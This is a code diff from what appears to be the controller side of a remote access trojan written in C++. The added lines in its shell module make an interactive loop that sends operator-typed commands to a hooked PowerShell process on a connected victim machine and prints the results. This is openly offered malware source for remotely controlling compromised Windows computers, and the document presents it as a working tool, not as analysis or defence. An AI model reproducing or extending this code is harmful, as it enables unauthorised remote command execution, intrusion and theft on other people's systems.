@@ -18,7 +18,23 @@ void ShellModule::execute(const SOCKET& sock) {
     // tell the connected rat to create/hook into a background powershell process
     std::string victProcCmd = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
     if (RatPacketUtils::Send(sock, RatPacket(victProcCmd, MsgType::INVOKE))) {
+        std::string input = "";
+        while (input != "exit") {
+            auto recvPacket = RatPacketUtils::Recv(sock);
+            if (recvPacket.second) {
+                std::string output = recvPacket.first.GetPacketMessage();
+                std::cout << output;
+            }
 
+            // allows for empty input
+            std::getline(std::cin, input);
+
+            if (!RatPacketUtils::Send(sock, RatPacket(input, MsgType::EXEC))) {
+                std::cout << "[-] Error sending command!" << std::endl;
+                break;
+            }
+        }
+        std::cerr << "- input: " << input << std::endl;
     }
     // kill powershell background process
     std::cout << "[*] Closing Shell Module. . ." << std::endl;
